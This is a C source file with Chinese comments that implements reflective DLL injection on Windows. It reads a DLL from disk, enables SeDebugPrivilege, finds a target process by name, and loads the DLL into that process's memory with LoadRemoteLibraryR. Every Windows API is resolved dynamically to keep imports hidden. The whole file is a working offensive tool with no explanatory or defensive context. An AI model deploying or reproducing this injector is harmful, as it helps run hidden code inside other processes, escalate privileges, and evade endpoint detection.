#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "LoadLibraryR.h"
#include "Inject.h"
#include "Stub.h"
#pragma comment(lib,"Advapi32.lib")

DWORD ProcesstoPid(char *Processname);

//int main(int argc, char * argv[])
//{
//
//	char* cpDllFile = "ReflectDll_Dll.dll";
//	char* ProcessName = "12345.exe";
//	BOOL x = InjectDll(cpDllFile, ProcessName);
//
//
//	return 0;
//}


BOOL InjectDll(char* cpDllFile, char* ProcessName)
{
	//初始化函数地址
	HMODULE hKernel32 = GetKernel32BaseAddr();
	fnGetProcAddress g_pfnGetProcAddress =
		(fnGetProcAddress)MyGetProcAddress();
	fnLoadLibraryA g_pfnLoadLibraryA =
		(fnLoadLibraryA)g_pfnGetProcAddress(hKernel32, "LoadLibraryA");
	pfnCreateFileA MyCreateFileA =
		(pfnCreateFileA)g_pfnGetProcAddress(hKernel32, "CreateFileA");
	
	pfnGetFileSize MyGetFileSize =
		(pfnGetFileSize)g_pfnGetProcAddress(hKernel32, "GetFileSize");

	pfnHeapAlloc MyHeapAlloc =
		(pfnHeapAlloc)g_pfnGetProcAddress(hKernel32, "HeapAlloc");

	pfnReadFile MyReadFile =
		(pfnReadFile)g_pfnGetProcAddress(hKernel32,"ReadFile");

	HMODULE hAdvapi32 = g_pfnLoadLibraryA("Advapi32.dll");
	pfnOpenProcessToken MyOpenProcessToken =
		(pfnOpenProcessToken)g_pfnGetProcAddress(hAdvapi32,"OpenProcessToken");
	pfnGetCurrentProcess MyGetCurrentProcess =
		(pfnGetCurrentProcess)g_pfnGetProcAddress(hAdvapi32, "GetCurrentProcess");

	pfnLookupPrivilegeValueA MyLookupPrivilegeValueA =
		(pfnLookupPrivilegeValueA)g_pfnGetProcAddress(hAdvapi32, "LookupPrivilegeValueA");

	pfnAdjustTokenPrivileges MyAdjustTokenPrivileges =
		(pfnAdjustTokenPrivileges)g_pfnGetProcAddress(hAdvapi32, "AdjustTokenPrivileges");

	pfnCloseHandle MyCloseHandle =
		(pfnCloseHandle)g_pfnGetProcAddress(hKernel32, "CloseHandle");

	pfnOpenProcess MyOpenProcess =
		(pfnOpenProcess)g_pfnGetProcAddress(hKernel32, "OpenProcess");

	pfnWaitForSingleObject MyWaitForSingleObject =
		(pfnWaitForSingleObject)g_pfnGetProcAddress(hKernel32, "WaitForSingleObject");

	pfnHeapFree MyHeapFree =
		(pfnHeapFree)g_pfnGetProcAddress(hKernel32, "HeapFree");

	pfnGetProcessHeap MyGetProcessHeap =
		(pfnGetProcessHeap)g_pfnGetProcAddress(hKernel32, "GetProcessHeap");

	//===========================================================================

	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	
	DWORD dwBytesRead = 0;

	//将进程名转化为PID
	DWORD dwProcessId = ProcesstoPid(ProcessName);
	TOKEN_PRIVILEGES priv = { 0 };

	HANDLE hFile = NULL;
	hFile = MyCreateFileA(cpDllFile, 
		GENERIC_READ, 
		0, 
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
		//fprintf(fp, "[!]InjectDll--->CreateFileA...failed:%d\n",GetLastError());

	DWORD dwLength = 0;
	dwLength = MyGetFileSize(hFile, NULL);
	//if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
		//fprintf(fp, "[!]InjectDll--->GetFileSize...failed:%d\n", GetLastError());

	LPVOID lpBuffer = NULL;
	lpBuffer = MyHeapAlloc(MyGetProcessHeap(), 0, dwLength);
	if (!lpBuffer)
		return FALSE;
		//fprintf(fp, "[!]InjectDll--->HeapAlloc...failed:%d\n", GetLastError());

	if (MyReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE)
		return FALSE;
		//fprintf(fp, "[!]InjectDll--->ReadFile...failed:%d\n", GetLastError());

	if(MyOpenProcessToken(MyGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (MyLookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			MyAdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		MyCloseHandle(hToken);
	}



	hProcess = MyOpenProcess(PROCESS_CREATE_THREAD |PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
		FALSE, 
		dwProcessId);
	if (!hProcess)
		return FALSE;
		//fprintf(fp, "[!]InjectDll--->OpenProcess...failed:%d\n", GetLastError());

	hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
		return FALSE;
		//fprintf(fp, "[!]InjectDll--->LoadRemoteLibraryR...failed:%d\n", GetLastError());

	//fprintf(fp,"[*]Injected the '%s' DLL into process %d\n", cpDllFile, dwProcessId);

	MyWaitForSingleObject(hModule, -1);


	if (lpBuffer)
		MyHeapFree(MyGetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		MyCloseHandle(hProcess);

	return TRUE;
}


DWORD ProcesstoPid(char *Processname) //查找指定进程的PID(Process ID)
{
	//初始化函数
	HMODULE hKernel32 = GetKernel32BaseAddr();
	fnGetProcAddress g_pfnGetProcAddress =
		(fnGetProcAddress)MyGetProcAddress();
	fnLoadLibraryA g_pfnLoadLibraryA =
		(fnLoadLibraryA)g_pfnGetProcAddress(hKernel32, "LoadLibraryA");

	pfnCreateToolhelp32Snapshot MyCreateToolhelp32Snapshot =
		(pfnCreateToolhelp32Snapshot)g_pfnGetProcAddress(hKernel32, "CreateToolhelp32Snapshot");

	pfnProcess32First MyProcess32First =
		(pfnProcess32First)g_pfnGetProcAddress(hKernel32,"Process32First");

	pfnProcess32Next MyProcess32Next =
		(pfnProcess32Next)g_pfnGetProcAddress(hKernel32, "Process32Next");

	pfnCloseHandle MyCloseHandle =
		(pfnCloseHandle)g_pfnGetProcAddress(hKernel32, "CloseHandle");

	HANDLE hProcessSnap = NULL;
	DWORD dwProcessId = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = MyCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		//printf("CreateToolhelp32Snapshot:%d\n", GetLastError());
		return NULL;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);   //初始化PROCESSENTRY32结构体
	if (MyProcess32First(hProcessSnap, &pe32))
	{
		do
		{
			if (MyStrcmp(pe32.szExeFile, Processname))
			{
				dwProcessId = pe32.th32ProcessID;
				break;
			}
		} while (MyProcess32Next(hProcessSnap, &pe32));
	}
	else
	{
		//printf("Process32First:%d\n", GetLastError());
		return NULL;
	}
	MyCloseHandle(hProcessSnap);
	return dwProcessId;
}

